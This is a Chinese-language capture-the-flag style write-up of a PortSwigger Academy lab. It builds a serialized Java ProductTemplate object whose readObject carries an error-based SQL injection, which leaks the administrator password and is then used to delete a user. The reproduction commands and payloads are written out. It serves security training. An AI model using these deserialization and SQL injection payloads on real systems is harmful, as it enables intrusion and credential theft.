---
title: "lab-deserialization-developing-a-custom-gadget-chain-for-java-deserialization"
links:
  - target: deserialization-family
    relation: evidences
---

# lab-deserialization-developing-a-custom-gadget-chain-for-java-deserialization

> evidences: [[deserialization-family]]

- 题面:Developing a custom gadget chain for Java deserialization(/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-java-deserialization)
- 实例:https://0ac3003d0320b88180fa215200d7004a.web-security-academy.net (`wiener:peter`)
- 判定目标:拿到 administrator 口令并登录后删除 carlos;状态:**solved**(批 32)

## 一、源码从站内 `/backup/` 泄漏

页面 HTML 注释:`<!-- <a href=/backup/AccessTokenUser.java>Example user</a> -->`。
`GET /backup/` 是目录索引,列出 `AccessTokenUser.java` 与 **`ProductTemplate.java`**(即"另一个 topic"
= 信息泄漏/备份文件;题面 "requires basic familiarity with another topic")。**不需读 GitHub `solution/`。**

## 二、gadget 与通道

`ProductTemplate.readObject()`(源码原文):
```java
String sql = String.format("SELECT * FROM products WHERE id = '%s' LIMIT 1", id);
... statement.executeQuery(sql); product = Product.from(resultSet);
catch (SQLException e) { throw new IOException(e); }
```
即 **`id` 处的 SQL 注入**;`SQLException` 被包成 `IOException`。

应用反序列化 session 后强转 `lab.actions.common.serializable.AccessTokenUser`:
```
java.lang.ClassCastException: Cannot cast data.productcatalog.ProductTemplate to lab.actions.common.serializable.AccessTokenUser
```
`readObject` **在强转之前已执行**,且应用把异常消息(含 Postgres 报错原文)回显在 500 页
→ **报错回显型 SQLi 就是取数通道**。

## 三、构造(真 JDK:javac 编译 → ObjectOutputStream → base64)

`/tmp/b32-java/src`:照抄 `data/productcatalog/ProductTemplate.java` + 两个仅编译用 stub
(`data/productcatalog/Product`、`common/db/JdbcConnectionBuilder`),`Main` 输出
`ObjectOutputStream` 字节的 base64。新件 `java_ser` 封装:编译源树→跑 Main→写 lab_http jar。

- 探针 `id="PROD1'"` → 500 回显 `PSQLException: Unterminated string literal started at position 41 in SQL SELECT * FROM products WHERE id = 'PROD1'' LIMIT 1`(证明回显)。
- 取口令:
  `id = PROD1' AND 1=CAST((SELECT password FROM users WHERE username='administrator') AS int)--`
  → 500 回显 `ERROR: invalid input syntax for type integer: "wscxn6d9j3976ch3cejf"`
  → **administrator 口令 = `wscxn6d9j3976ch3cejf`**。
- 以 administrator 登录(`POST /login` 表单,无 csrf) → `GET /admin` → `GET /admin/delete?username=carlos` → 翻牌。

## 复现命令

```
use java_ser <src> Main --arg "<id>" --host <host> --jar <jar> --classes <dir>
# id 探针:PROD1'   取数:PROD1' AND 1=CAST((SELECT password FROM users WHERE username='administrator') AS int)--
lab_http post "<inst>/login" --form username=administrator --form password=wscxn6d9j3976ch3cejf
lab_http get  "<inst>/admin" --jar <jar>            # 删人链接 /admin/delete?username=carlos
lab_http get  "<inst>/admin/delete?username=carlos"
```

## 证据摘录

```
GET /backup/ -> Index of /backup: AccessTokenUser.java, ProductTemplate.java
class-cast 500: java.lang.ClassCastException: Cannot cast data.productcatalog.ProductTemplate to lab.actions.common.serializable.AccessTokenUser
sql-error 500: java.io.IOException: org.postgresql.util.PSQLException: ERROR: invalid input syntax for type integer: "wscxn6d9j3976ch3cejf"
GET /admin (administrator) -> Delete carlos link
GET /admin/delete?username=carlos -> 302
solved_check -> {"congrats_line":"...you solved the lab!","solved":true}
```
